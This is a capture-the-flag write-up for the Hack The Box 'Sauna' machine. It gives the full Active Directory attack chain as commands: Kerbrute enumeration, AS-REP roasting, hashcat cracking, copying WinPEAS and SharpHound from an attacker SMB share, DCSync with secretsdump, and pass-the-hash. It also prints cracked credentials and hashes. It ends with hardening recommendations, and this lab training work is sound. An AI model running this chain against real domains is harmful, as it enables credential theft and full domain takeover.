# Sauna HTB

## Executive Summary

This report documents the complete penetration testing process for the Sauna HTB machine, covering reconnaissance, enumeration, exploitation, lateral movement, and privilege escalation leading to full domain compromise.

**Target**: `10.129.23.17`  
**Domain**: `EGOTISTICAL-BANK.LOCAL`  
**Difficulty**: Medium  
**Attack Vector**: Kerberos AS-REP Roasting → Lateral Movement → DCSync Attack

## Reconnaissance

### Initial Port Scan
```bash
export target=10.129.23.17
sudo nmap -p- --min-rate 1000 -sT -vvv $target
```

<img width="457" height="74" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />

<img width="512" height="502" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />

**Open Ports Discovered**:
```
53/tcp    - DNS
80/tcp    - HTTP
88/tcp    - Kerberos
135/tcp   - RPC
139/tcp   - NetBIOS-SSN
389/tcp   - LDAP
445/tcp   - SMB
593/tcp   - RPC over HTTP
636/tcp   - LDAPS
3268/tcp  - Global Catalog
3269/tcp  - Global Catalog SSL
5985/tcp  - WinRM
9389/tcp  - AD WS
49668/tcp - Unknown
49673/tcp - Unknown
49674/tcp - Unknown
49677/tcp - Unknown
49698/tcp - Unknown
```

### Service Version Detection
```bash
sudo nmap -sC -sV -p 53,80,88,135,139,389,445,593,636,3268,3269,5985,9389,49668,49673,49674,49677,49698 -T4 $target
```

<img width="957" height="852" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />

**Key Services Identified**:
- **Domain Controller**: Active Directory Environment
- **Web Server**: Port 80 - Corporate Website
- **Kerberos**: Port 88 - Authentication Service
- **SMB**: Port 445 - File Sharing
- **WinRM**: Port 5985 - Remote Management

---

## Service Enumeration

### Web Service Analysis
Visiting `http://10.129.23.17` revealed:
- Corporate website for "Egotistical Bank"

<img width="962" height="976" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />

- Potential usernames from employee mentions
- Domain: `EGOTISTICAL-BANK.LOCAL`

<img width="962" height="976" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />


### SMB Enumeration
```bash
smbclient -N -L //10.129.23.17/
```
- Anonymous access attempted
- No accessible shares found

<img width="721" height="171" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />

### RPC Enumeration

<img width="442" height="197" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />

### LDAP Reconnaissance
```bash
ldapsearch -x -H ldap://10.129.23.17 -s base namingcontexts
ldapsearch -x -H ldap://10.129.23.17 -D 'CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL'
```
- Initial LDAP queries unsuccessful
- Required authenticated access

<img width="748" height="819" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />


---

## Domain Enumeration

### Username Discovery
From website analysis, compiled potential usernames:

<img width="962" height="976" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />

```
fsmith
hsmith
administrator
Administrator
skerb
btaylor
hbear
sdriver
scoins
```


<img width="951" height="368" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />

### Kerbrute User Enumeration
```bash
./kerbrute_linux_amd64 userenum --dc 10.129.23.17 -d 'EGOTISTICAL-BANK.LOCAL' ./user.txt -t 100
```

<img width="953" height="370" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />

**Valid Users Identified**:
- ✅ `administrator@EGOTISTICAL-BANK.LOCAL`
- ✅ `fsmith@EGOTISTICAL-BANK.LOCAL` 
- ✅ `hsmith@EGOTISTICAL-BANK.LOCAL`
- ✅ `Administrator@EGOTISTICAL-BANK.LOCAL`

### AS-REP Roasting Attack
```bash
for i in $(cat user.txt); do 
    impacket-GetNPUsers -no-pass -dc-ip 10.129.23.17 EGOTISTICAL-BANK.LOCAL/${i} | grep -v Impacket 2>/dev/null 
done
```

<img width="952" height="641" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />

**Hash Captured**:
```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:2b1986c97a10ef3204fb226b0e762434$3efb00e3a2e206f8e5db2c866150985e1bd7ddc93af53df430d9a84fb6666eeb4d0ba5d5225f38b7bc4568ca64460b7fa3e25533a8755d5331c6007165b2fed19e1b10573eb67cce743b8403f076c2b17479dfc00c7b583d53b5c0d03f12d7fdccbe7dd8d731bf4a30640359af936ad38566b85f09438f1edfe563e01289ab62dc094f4026731ae197e86bfdf1e4fd3a276f09f99123fcdb5d5e2e35f79e37feb566926d37dea632f8150cd4cd73e5206943fee0ec6db3744ef31c04c966be4ba9d3e0a8a8616c7a976bf8bd12355baca356b47b7134d1e41121b61338809045b79639d4425ebc13e12f7020e10740c0a5aec0c1ae02e300e5f9361ff97ce21e
```

### Password Cracking
```bash
hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
```

**Cracked Credentials**:
- **Username**: `fsmith`
- **Password**: `Thestrokes23`

---

## Initial Compromise

### WinRM Access
```bash
evil-winrm -i 10.129.23.17 -u fsmith -p 'Thestrokes23'
```

<img width="580" height="845" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />

**User Flag Captured**:
```
ed460a49a0244195b79ac008552d0ed5
```

### Internal Reconnaissance
Transferred and executed WinPEAS for privilege escalation analysis:
```powershell
net use \\10.10.14.90\share /u:ara ara
copy \\10.10.14.90\share\winpeas.exe .
.\winpeas.exe -cmd fast
```

<img width="663" height="281" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />

**Critical Finding - AutoLogon Credentials**:
```
DefaultDomainName: EGOTISTICALBANK
DefaultUserName: EGOTISTICALBANK\svc_loanmanager  
DefaultPassword: Moneymakestheworldgoround!
```

<img width="568" height="115" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />

---

## Lateral Movement

### Service Account Access
```bash
evil-winrm -i 10.129.23.17 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

<img width="651" height="315" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />

### BloodHound Enumeration
Transferred SharpHound collector and extracted domain data:
```powershell
copy \\10.10.14.90\share\SharpHound.exe .
.\SharpHound.exe
```

**BloodHound Analysis Revealed**:
- `svc_loanmgr` has `GetChangesAll` permission
- Capable of performing DCSync attack

---

## Privilege Escalation

### DCSync Attack
```bash
impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!@10.129.23.17'
```

<img width="950" height="644" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />

**Administrator Hash Extracted**:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

### Pass-the-Hash Attack
```bash
evil-winrm -i 10.129.23.17 -u Administrator -H '823452073d75b9d1cf70ebdf86c7f98e'
```

<img width="951" height="579" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />

---

## Domain Compromise

### Root Flag Captured
```powershell
type C:\Users\Administrator\Desktop\root.txt
```
```
114ef3fc9eebaf7b583e12c1ce87c3bc
```

### Full Domain Control Achieved
- ✅ Domain Administrator access
- ✅ Ability to extract all domain credentials
- ✅ Complete control over EGOTISTICAL-BANK.LOCAL domain

---

## Lessons Learned

### Security Vulnerabilities Identified

1. **Weak Password Policy**
   - Easily crackable user passwords
   - No account lockout policy evident

2. **Kerberos Misconfiguration**
   - AS-REP Roasting vulnerability
   - Pre-authentication not required for some accounts

3. **Excessive Service Account Permissions**
   - `svc_loanmgr` had unnecessary DCSync rights
   - Poor principle of least privilege implementation

4. **Credential Exposure**
   - AutoLogon credentials stored insecurely
   - Clear-text credentials recoverable from registry

### Recommendations

1. **Implement Strong Password Policies**
   - Enforce complex password requirements
   - Implement account lockout mechanisms

2. **Kerberos Hardening**
   - Require pre-authentication for all accounts
   - Monitor for AS-REP Roasting attempts

3. **Principle of Least Privilege**
   - Review and restrict service account permissions
   - Regular access control audits

4. **Credential Protection**
   - Eliminate AutoLogon in enterprise environments
   - Implement LAPS for local administrator passwords

---

## Tools Used
- **Nmap** - Port scanning and service enumeration
- **Kerbrute** - Username enumeration
- **Impacket** - AS-REP roasting and DCSync attacks
- **Hashcat** - Password cracking
- **Evil-WinRM** - Remote system access
- **WinPEAS** - Windows privilege escalation enumeration
- **BloodHound/SharpHound** - Active Directory analysis

---
<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
